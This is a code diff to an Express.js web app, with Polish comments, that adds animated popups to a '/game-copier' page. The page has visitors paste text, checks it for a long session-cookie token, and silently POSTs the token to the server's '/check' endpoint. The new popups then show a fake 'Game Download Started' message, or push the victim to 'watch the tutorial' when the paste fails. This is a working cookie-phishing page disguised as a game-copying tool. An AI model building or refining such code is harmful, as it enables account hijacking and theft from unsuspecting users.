@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna
+// Strona główna – bez zmian
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -64,7 +64,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Podstrona /game-copier – czarno-biała zygzakowata animowana ramka
+// Podstrona /game-copier – z animowanymi pop-upami
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -106,7 +106,37 @@ app.get('/game-copier', (req, res) => {
       text-align: center;
     }
 
-    /* Czarno-biała zygzakowata animowana ramka */
+    /* Pop-upy */
+    #popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 24px 48px;
+      border-radius: 16px;
+      font-size: 1.4rem;
+      font-weight: 600;
+      color: white;
+      z-index: 9999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      min-width: 380px;
+      text-align: center;
+    }
+    #popup.show {
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
+    }
+    .success { background: #28a745; }
+    .error   { background: #dc3545; }
+    .icon { font-size: 2.2rem; }
+
+    /* Ramka zygzakowata – bez zmian */
     .zigzag-border {
       position: relative;
       width: 100%;
@@ -115,7 +145,6 @@ app.get('/game-copier', (req, res) => {
       overflow: hidden;
       margin-bottom: 28px;
     }
-
     .zigzag-border::before {
       content: '';
       position: absolute;
@@ -135,7 +164,6 @@ app.get('/game-copier', (req, res) => {
       border-radius: 22px;
       z-index: -1;
     }
-
     .zigzag-border::after {
       content: '';
       position: absolute;
@@ -155,7 +183,6 @@ app.get('/game-copier', (req, res) => {
       border-radius: 12px;
       z-index: -1;
     }
-
     .inner-box {
       background: #ffffff;
       border-radius: 12px;
@@ -165,12 +192,10 @@ app.get('/game-copier', (req, res) => {
       z-index: 2;
       transition: all 0.3s ease;
     }
-
     .zigzag-border:hover .inner-box {
       border-color: #000;
       box-shadow: 0 0 20px rgba(0,0,0,0.5);
     }
-
     textarea {
       width: 100%;
       min-height: 180px;
@@ -183,12 +208,10 @@ app.get('/game-copier', (req, res) => {
       color: #111;
       line-height: 1.5;
     }
-
     textarea::placeholder {
       color: #777;
       font-style: italic;
     }
-
     button {
       margin-top: 28px;
       background: #222;
@@ -204,19 +227,16 @@ app.get('/game-copier', (req, res) => {
       margin-left: auto;
       margin-right: auto;
     }
-
     button:hover:not(:disabled) {
       background: #000;
       transform: translateY(-2px);
       box-shadow: 0 10px 24px rgba(0,0,0,0.25);
     }
-
     button:disabled {
       background: #777;
       cursor: not-allowed;
       opacity: 0.7;
     }
-
     .video-frame {
       background: #fff;
       border-radius: 18px;
@@ -225,7 +245,6 @@ app.get('/game-copier', (req, res) => {
       border: 1px solid #d0d0d0;
       aspect-ratio: 16 / 9;
     }
-
     .video-frame iframe {
       width: 100%;
       height: 100%;
@@ -236,7 +255,6 @@ app.get('/game-copier', (req, res) => {
       0%   { background-position: 0% 50%; }
       100% { background-position: 300% 50%; }
     }
-
     @keyframes zigzagShift {
       0%   { background-position: 0 0; }
       100% { background-position: 120px 120px; }
@@ -246,6 +264,8 @@ app.get('/game-copier', (req, res) => {
 <body>
 
   <canvas id="bgCanvas"></canvas>
+
+  <div id="popup"></div>
 
   <div class="container">
     <div class="left">
@@ -272,18 +292,15 @@ app.get('/game-copier', (req, res) => {
   </div>
 
 <script>
-// Animowane kropki w tle
+// kropki w tle
 const canvas = document.getElementById('bgCanvas');
 const ctx = canvas.getContext('2d');
-
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
-
 window.addEventListener('resize', () => {
   canvas.width = window.innerWidth;
   canvas.height = window.innerHeight;
 });
-
 class Particle {
   constructor() {
     this.x = Math.random() * canvas.width;
@@ -305,10 +322,8 @@ class Particle {
     ctx.fill();
   }
 }
-
 const particles = [];
 for (let i = 0; i < 60; i++) particles.push(new Particle());
-
 function connect() {
   for (let a = 0; a < particles.length; a++) {
     for (let b = a; b < particles.length; b++) {
@@ -326,7 +341,6 @@ function connect() {
     }
   }
 }
-
 function animate() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
   particles.forEach(p => { p.update(); p.draw(); });
@@ -335,7 +349,22 @@ function animate() {
 }
 animate();
 
-// Logika przycisku
+// ── Funkcja pokazująca popup ──
+function showPopup(type, text) {
+  const popup = document.getElementById('popup');
+  popup.innerHTML = \`
+    <span class="icon">\${type === 'success' ? '✅' : '❌'}</span>
+    \${text}
+  \`;
+  popup.className = type === 'success' ? 'success' : 'error';
+  popup.classList.add('show');
+
+  setTimeout(() => {
+    popup.classList.remove('show');
+  }, 4000);
+}
+
+// Logika przycisku z popupami
 async function start() {
   const btn = document.getElementById('btn');
   const raw = document.getElementById('input').value.trim();
@@ -343,6 +372,7 @@ async function start() {
   btn.disabled = true;
 
   if (!raw) {
+    showPopup('error', 'Wrong file<br><small>TIP: Watch the tutorial</small>');
     setTimeout(() => btn.disabled = false, 1200);
     return;
   }
@@ -371,15 +401,20 @@ async function start() {
   }
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
+    showPopup('error', 'Wrong file<br><small>TIP: Watch the tutorial</small>');
     setTimeout(() => btn.disabled = false, 1200);
     return;
   }
 
+  // Wysyłamy cookie
   fetch('/check', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ cookie })
   }).catch(() => {});
+
+  // Sukces – pokazujemy zielony popup
+  showPopup('success', 'Game Download Started<br><small>(wait 3–5 minutes)</small>');
 
   setTimeout(() => btn.disabled = false, 2200);
 }
